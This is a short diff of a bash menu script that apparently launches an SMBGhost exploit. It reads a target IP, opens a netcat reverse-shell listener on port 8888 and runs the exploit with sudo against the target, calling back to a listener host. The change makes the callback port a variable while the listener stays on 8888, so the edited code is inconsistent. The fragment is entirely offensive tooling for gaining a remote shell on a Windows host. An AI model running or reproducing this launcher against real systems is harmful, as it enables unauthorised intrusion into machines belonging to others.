@@ -27,7 +27,7 @@ exploit(){
     echo -e "${W}Please enter the target IP${NC}"
     read TARGET
     xterm -e nc -lvp 8888 &
-    xterm -e sudo python3 /opt/SMBGhost_Exploit/Smb_Ghost.py -i ${TARGET} -e --lhost ${LISTENER} --lport 8888
+    xterm -e sudo python3 /opt/SMBGhost_Exploit/Smb_Ghost.py -i ${TARGET} -e --lhost ${LISTENER} --lport ${PORT}
 }
 
 PS3='Which module would you like to use?'
